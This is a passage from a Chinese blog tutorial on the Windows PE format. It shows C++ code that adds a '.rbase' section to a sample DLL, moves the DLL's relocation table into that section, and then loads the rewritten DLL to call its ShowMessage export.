class="line"><span class="function"></span>&#123;</span><br><span class="line">    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBuffer;</span><br><span class="line">    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos);</span><br><span class="line">    PIMAGE_SECTION_HEADER pSec = <span class="built_in">IMAGE_FIRST_SECTION</span>(pNt);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dwFOA &lt; pSec[<span class="number">0</span>].PointerToRawData)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> dwFOA;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (dwFOA &gt;= pSec[i].PointerToRawData &amp;&amp; dwFOA &lt; pSec[i].PointerToRawData + pSec[i].SizeOfRawData)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> pSec[i].VirtualAddress + dwFOA - pSec[i].PointerToRawData;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dwFOA;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="移动重定位表具体步骤"><a href="#移动重定位表具体步骤" class="headerlink" title="移动重定位表具体步骤"></a>移动重定位表具体步骤</h3><ol><li>读取Dll文件至内存中</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 读取文件</span></span><br><span class="line">HANDLE hFile = <span class="built_in">CreateFileA</span>(</span><br><span class="line">    FilePath_SRC,</span><br><span class="line">    GENERIC_READ,</span><br><span class="line">    FILE_SHARE_READ,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    OPEN_EXISTING,</span><br><span class="line">    FILE_ATTRIBUTE_ARCHIVE,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == hFile)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CreateFileA Failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">DWORD dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;dwFileSize: %d\n&quot;</span>, dwFileSize);</span><br><span class="line">LPVOID lpData = <span class="keyword">new</span> BYTE[dwFileSize];</span><br><span class="line"><span class="keyword">if</span> (lpData == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;申请内存失败\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">DWORD dwRead = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (FALSE == <span class="built_in">ReadFile</span>(hFile, lpData, dwFileSize, &amp;dwRead, <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ReadFile Failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;lpData: %x\n&quot;</span>, *(<span class="type">short</span>*)lpData);</span><br></pre></td></tr></table></figure><ol start="2"><li>新增节表<blockquote><p>新增<code>.rbase</code>节表</p></blockquote></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 解析PE文件</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpData;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)lpData);</span><br><span class="line">PIMAGE_SECTION_HEADER pSec = <span class="built_in">IMAGE_FIRST_SECTION</span>(pNt);</span><br><span class="line"><span class="comment">//printf(&quot;pDos: %x\n&quot;, pDos-&gt;e_magic);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 新增节表</span></span><br><span class="line">PIMAGE_SECTION_HEADER pNewSec = pSec + pNt-&gt;FileHeader.NumberOfSections;</span><br><span class="line"><span class="keyword">if</span> (((DWORD)lpData + dwFileSize - (DWORD)pNewSec) &lt; <span class="number">80</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;空间不足新增节表\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置节表信息</span></span><br><span class="line"><span class="built_in">strcpy</span>((<span class="type">char</span>*)pNewSec-&gt;Name, <span class="string">&quot;.rbase&quot;</span>);</span><br><span class="line">pNewSec-&gt;Misc.VirtualSize = <span class="number">0x7000</span>;</span><br><span class="line">pNewSec-&gt;VirtualAddress = pNt-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line">pNewSec-&gt;SizeOfRawData = <span class="number">0x7000</span>;</span><br><span class="line">PIMAGE_SECTION_HEADER pLastSec = pSec + (pNt-&gt;FileHeader.NumberOfSections - <span class="number">1</span>);</span><br><span class="line">pNewSec-&gt;PointerToRawData = pLastSec-&gt;PointerToRawData + pLastSec-&gt;SizeOfRawData;</span><br><span class="line">pNewSec-&gt;Characteristics = pSec[<span class="number">0</span>].Characteristics;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修正PE头</span></span><br><span class="line">pNt-&gt;FileHeader.NumberOfSections += <span class="number">1</span>;</span><br><span class="line">pNt-&gt;OptionalHeader.SizeOfImage += <span class="number">0x7000</span>;</span><br></pre></td></tr></table></figure><ol start="3"><li>复制重定位表</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">LPVOID lpSecMemory = <span class="keyword">new</span> BYTE[<span class="number">0x7000</span>];</span><br><span class="line"><span class="keyword">if</span> (lpSecMemory == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;新节表申请内存失败\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(lpSecMemory, <span class="number">0</span>, <span class="number">0x7000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析重定位表</span></span><br><span class="line">PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_BASERELOC);</span><br><span class="line">PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(<span class="built_in">RVA2FOA</span>(pDir-&gt;VirtualAddress, lpData) + (DWORD)lpData);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pDir-&gt;Size: %x\n&quot;</span>, pDir-&gt;Size);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 复制重定位表</span></span><br><span class="line"> <span class="built_in">memcpy</span>(lpSecMemory, pReloc, pDir-&gt;Size);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修正数据目录</span></span><br><span class="line">pDir-&gt;VirtualAddress = <span class="built_in">FOA2RVA</span>(dwFileSize, lpData);</span><br></pre></td></tr></table></figure><ol start="4"><li><p>将数据写入新文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 打开新文件</span></span><br><span class="line">HANDLE hNewFile = <span class="built_in">CreateFileA</span>(FilePath_DEST, GENERIC_WRITE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == hNewFile)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CreateFileA Failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 写出第一部分</span></span><br><span class="line">DWORD lpNumberOfBytesWritten1 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (FALSE == <span class="built_in">WriteFile</span>(hNewFile, lpData, dwFileSize, &amp;lpNumberOfBytesWritten1, <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;WriteFile One Failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 写出新节</span></span><br><span class="line">DWORD lpNumberOfBytesWritten2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (FALSE == <span class="built_in">WriteFile</span>(hNewFile, lpSecMemory, <span class="number">0x7000</span>, &amp;lpNumberOfBytesWritten2, <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;WriteFile Two Failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hNewFile);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WriteFile Success: %d %d\n&quot;</span>, lpNumberOfBytesWritten1, lpNumberOfBytesWritten2);</span><br></pre></td></tr></table></figure></li><li><p>调用新的Dll文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*MyShowMessage)</span><span class="params">()</span></span>;</span><br><span class="line">HMODULE hDll = <span class="built_in">LoadLibraryA</span>(FilePath_DEST);</span><br><span class="line"><span class="keyword">if</span> (hDll == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;LoadLibraryA Failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">MyShowMessage myShowMessage = (MyShowMessage)<span class="built_in">GetProcAddress</span>(hDll, <span class="string">&quot;ShowMessage&quot;</span>);</span><br><span class="line"><span class="built_in">myShowMessage</span>();</span><br></pre></td></tr></table></figure></li></ol><h3 id="运行成功"><a href="#运行成功" class="headerlink" title="运行成功"></a>运行成功</h3><p><img src="https://raw.githubusercontent.com/Dooookey/Photos/main/202407021628694.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/Dooookey/Photos/main/202407021628694.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="移动重定位表"></p><h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> <span class="keyword">auto</span> FilePath_SRC = <span class="string">&quot;xxx\\Dll1.dll&quot;</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="keyword">auto</span> FilePath_DEST = <span class="string">&quot;xxx\\Dll1_demo.dll&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">RVA2FOA</span><span class="params">(DWORD dwRVA, LPVOID lpBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBuffer;</span><br><span class="line">    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos);</span><br><span class="line">    PIMAGE_SECTION_HEADER pSec = <span class="built_in">IMAGE_FIRST_SECTION</span>(pNt);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dwRVA &lt; pSec[<span class="number">0</span>].VirtualAddress)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> dwRVA;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (dwRVA &gt;= pSec[i].VirtualAddress &amp;&amp; dwRVA &lt;= pSec[i].VirtualAddress + pSec[i].Misc.VirtualSize)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> dwRVA - pSec[i].VirtualAddress + pSec[i].PointerToRawData;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dwRVA;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">FOA2RVA</span><span class="params">(DWORD dwFOA, LPVOID lpBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBuffer;</span><br><span class="line">    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos);</span><br><span class="line">    PIMAGE_SECTION_HEADER pSec = <span class="built_in">IMAGE_FIRST_SECTION</span>(pNt);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dwFOA &lt; pSec[<span class="number">0</span>].PointerToRawData)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> dwFOA;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (dwFOA &gt;= pSec[i].PointerToRawData &amp;&amp; dwFOA &lt; pSec[i].PointerToRawData + pSec[i].SizeOfRawData)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> pSec[i].VirtualAddress + dwFOA - pSec[i].PointerToRawData;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dwFOA;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 读取文件</span></span><br><span class="line">    HANDLE hFile = <span class="built_in">CreateFileA</span>(</span><br><span class="line">        FilePath_SRC,</span><br><span class="line">        GENERIC_READ,</span><br><span class="line">        FILE_SHARE_READ,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        OPEN_EXISTING,</span><br><span class="line">        FILE_ATTRIBUTE_ARCHIVE,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (INVALID_HANDLE_VALUE == hFile)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateFileA Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;dwFileSize: %d\n&quot;</span>, dwFileSize);</span><br><span class="line">    LPVOID lpData = <span class="keyword">new</span> BYTE[dwFileSize];</span><br><span class="line">    <span class="keyword">if</span> (lpData == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;申请内存失败\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD dwRead = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (FALSE == <span class="built_in">ReadFile</span>(hFile, lpData, dwFileSize, &amp;dwRead, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ReadFile Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;lpData: %x\n&quot;</span>, *(<span class="type">short</span>*)lpData);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析PE文件</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpData;</span><br><span class="line">    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)lpData);</span><br><span class="line">    PIMAGE_SECTION_HEADER pSec = <span class="built_in">IMAGE_FIRST_SECTION</span>(pNt);</span><br><span class="line">    <span class="comment">//printf(&quot;pDos: %x\n&quot;, pDos-&gt;e_magic);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 新增节表</span></span><br><span class="line">    PIMAGE_SECTION_HEADER pNewSec = pSec + pNt-&gt;FileHeader.NumberOfSections;</span><br><span class="line">    <span class="keyword">if</span> (((DWORD)lpData + dwFileSize - (DWORD)pNewSec) &lt; <span class="number">80</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;空间不足新增节表\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置节表信息</span></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span>*)pNewSec-&gt;Name, <span class="string">&quot;.rbase&quot;</span>);</span><br><span class="line">    pNewSec-&gt;Misc.VirtualSize = <span class="number">0x7000</span>;</span><br><span class="line">    pNewSec-&gt;VirtualAddress = pNt-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line">    pNewSec-&gt;SizeOfRawData = <span class="number">0x7000</span>;</span><br><span class="line">    PIMAGE_SECTION_HEADER pLastSec = pSec + (pNt-&gt;FileHeader.NumberOfSections - <span class="number">1</span>);</span><br><span class="line">    pNewSec-&gt;PointerToRawData = pLastSec-&gt;PointerToRawData + pLastSec-&gt;SizeOfRawData;</span><br><span class="line">    pNewSec-&gt;Characteristics = pSec[<span class="number">0</span>].Characteristics;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修正PE头</span></span><br><span class="line">    pNt-&gt;FileHeader.NumberOfSections += <span class="number">1</span>;</span><br><span class="line">    pNt-&gt;OptionalHeader.SizeOfImage += <span class="number">0x7000</span>;</span><br><span class="line"></span><br><span class="line">    LPVOID lpSecMemory = <span class="keyword">new</span> BYTE[<span class="number">0x7000</span>];</span><br><span class="line">    <span class="keyword">if</span> (lpSecMemory == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;新节表申请内存失败\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(lpSecMemory, <span class="number">0</span>, <span class="number">0x7000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析重定位表</span></span><br><span class="line">    PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_BASERELOC);</span><br><span class="line">    PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(<span class="built_in">RVA2FOA</span>(pDir-&gt;VirtualAddress, lpData) + (DWORD)lpData);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pDir-&gt;Size: %x\n&quot;</span>, pDir-&gt;Size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 复制重定位表</span></span><br><span class="line">     <span class="built_in">memcpy</span>(lpSecMemory, pReloc, pDir-&gt;Size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修正数据目录</span></span><br><span class="line">    pDir-&gt;VirtualAddress = <span class="built_in">FOA2RVA</span>(dwFileSize, lpData);</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 打开新文件</span></span><br><span class="line">    HANDLE hNewFile = <span class="built_in">CreateFileA</span>(FilePath_DEST, GENERIC_WRITE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (INVALID_HANDLE_VALUE == hNewFile)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateFileA Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 写出第一部分</span></span><br><span class="line">    DWORD lpNumberOfBytesWritten1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (FALSE == <span class="built_in">WriteFile</span>(hNewFile, lpData, dwFileSize, &amp;lpNumberOfBytesWritten1, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WriteFile One Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 写出新节</span></span><br><span class="line">    DWORD lpNumberOfBytesWritten2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (FALSE == <span class="built_in">WriteFile</span>(hNewFile, lpSecMemory, <span class="number">0x7000</span>, &amp;lpNumberOfBytesWritten2, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WriteFile Two Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hNewFile);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;WriteFile Success: %d %d\n&quot;</span>, lpNumberOfBytesWritten1, lpNumberOfBytesWritten2);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*MyShowMessage)</span><span class="params">()</span></span>;</span><br><span class="line">    HMODULE hDll = <span class="built_in">LoadLibraryA</span>(FilePath_DEST);</span><br><span class="line">    <span class="keyword">if</span> (hDll == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;LoadLibraryA Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    MyShowMessage myShowMessage = (MyShowMessage)<span class="built_in">GetProcAddress</span>(hDll, <span class="string">&quot;ShowMessage&quot;</span>);</span><br><span class="line">    <span class="built_in">myShowMessage</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="重建重定位结构"><a href="#重建重定位结构" class="headerlink" title="重建重定位结构"></a>重建重定位结构</h2><div class="note 